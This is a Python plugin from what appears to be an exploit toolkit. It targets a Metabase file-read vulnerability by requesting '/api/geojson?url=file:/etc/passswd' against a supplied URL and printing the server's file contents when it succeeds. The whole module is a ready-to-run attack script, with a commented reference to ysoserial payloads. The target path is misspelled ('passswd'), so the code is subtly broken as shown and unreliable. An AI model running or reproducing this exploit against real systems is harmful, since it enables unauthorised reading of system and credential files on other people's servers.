from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
import prettytable as pt
"""
import util.globalvar as GlobalVar
from ClassCongregation import ysoserial_payload,Dnslog
DL = Dnslog()
DL.dns_host()
DL.result()
"""
class MetaBase():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.status = env.get('status')
            
    def cve_MetaBase_20211123(self):
        appName = 'MetaBase'
        pocname = 'cve_MetaBase_20211123'
        path = '/api/geojson?url=file:/etc/passswd'
        method = 'get'
        desc = '[file reading] metabase version >= 1.0.0, < 1.40.5'
        data = ''
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)
        try:
            if self.vuln == 'False':
                r = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False)
                if r"root:x" in r.text:
                    self.status = 'success'
                    output.no_echo_success(method, desc)
                else:
                    output.fail()
            else:
                result = exprequest.get(self.url+path, data=data, headers=headers, retry_time=self.retry_time, retry_interval=self.retry_interval, timeout=self.timeout, verify=False).text
                print(result)
        except Exception as error:
            output.error_output(str(error))

tb = pt.PrettyTable()
tb.field_names = ['Target type', 'Vuln Name', 'Impact Version && Vulnerability description']
tb.align['Target type'] = 'l'
tb.align['Vuln Name'] = 'l'
tb.align['Impact Version && Vulnerability description'] = 'l'
tb.add_row([
    "MetaBase",
    "cve_MetaBase_20211123",
    "[file reading] metabase version >= 1.0.0, < 1.40.5"
])
print(tb)

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpMetaBase = MetaBase(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpMetaBase, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpMetaBase.status
    else:#调用所有函数
        for func in dir(MetaBase):
            if not func.startswith("__"):
                methodcaller(func)(ExpMetaBase)
                result_list.append(func+' -> '+ExpMetaBase.status)
                ExpMetaBase.status = 'fail'
    result_list.append('----------------------------')
    return ''.join(result_list).strip('\n')
